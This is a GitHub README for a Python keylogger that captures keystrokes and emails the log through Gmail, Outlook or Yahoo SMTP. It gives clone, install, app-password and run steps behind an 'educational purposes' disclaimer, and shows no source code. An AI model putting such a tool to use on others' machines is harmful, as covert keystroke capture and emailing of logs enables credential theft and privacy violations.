# Python Keylogger with Email Reporting

A Python-based keylogger that captures keyboard input and automatically sends logs via email for educational purposes only.

Repository: https://github.com/Prajjwal2051/Key-Logger.git

## ⚠️ IMPORTANT ETHICAL DISCLAIMER

**This tool is for educational and research purposes only.** Users are solely responsible for compliance with applicable laws and regulations.

### ✅ Ethical Uses:
- Learning cybersecurity concepts
- Testing your own systems
- Authorized penetration testing
- Digital forensics on systems you own

### ❌ Prohibited Uses:
- Unauthorized monitoring of others
- Installing on computers without permission
- Stealing credentials or personal information
- Violating privacy laws or terms of service

## 🚀 Features

- Real-time keystroke capture (including special keys)
- Automatic email reporting via SMTP when stopped
- Multi-provider support (Gmail, Outlook, Yahoo)
- Interactive email configuration setup
- App Password authentication for security
- Cross-platform compatibility (Windows, macOS, Linux)

## 📋 Prerequisites

- Python 3.6 or higher
- Internet connection for email functionality
- Install dependency: `pip install pynput`

## 📥 Installation

**Git Clone (Recommended):** `git clone https://github.com/Prajjwal2051/Key-Logger.git` then `cd Key-Logger`

**Direct Download:** Go to the repository URL, click "Code" → "Download ZIP", extract and open terminal in the folder

**Virtual Environment (Optional):** `python3 -m venv keylogger_env` then activate with `source keylogger_env/bin/activate` (Linux/macOS) or `keylogger_env\Scripts\activate` (Windows), then install: `pip install pynput`

## 📧 Email Setup Guide

### Gmail Setup (Recommended)
1. Enable 2-Step Verification at [Google Account Settings](https://myaccount.google.com) → Security → 2-Step Verification
2. Generate App Password: Security → App passwords → Mail → Generate 16-character password
3. Enable IMAP: Gmail Settings → Forwarding and POP/IMAP → Enable IMAP access

### Outlook/Hotmail Setup
1. Enable Two-step verification at [Microsoft Security Settings](https://account.microsoft.com/security)
2. Generate App Password: Security → App passwords → Mail

### Yahoo Mail Setup
1. Go to [Yahoo Account Security](https://login.yahoo.com/account/security)
2. Generate App Password: Security → App passwords → Mail

## 🖥️ Usage

1. **Run:** `python keylogger.py`
2. **Configure:** Enter sender email, App Password (not regular password), and recipient email when prompted
3. **Logging:** Program captures keystrokes and saves to `keylog.txt` with timestamps
4. **Stop:** Press **Escape** to stop and automatically email the log file

## 📁 File Structure

